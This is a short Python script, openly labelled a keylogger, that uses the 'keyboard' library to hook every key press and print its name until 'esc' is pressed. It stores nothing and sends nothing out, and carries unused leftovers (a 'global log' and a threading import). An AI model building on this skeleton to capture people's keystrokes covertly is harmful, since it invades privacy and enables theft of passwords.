import keyboard
import threading

def on_press(e):
    global log
    key = e.name
    print(key)


keyboard.on_press(on_press)

keyboard.wait("esc")    # Press 'esc' To Stop The KeyLogger
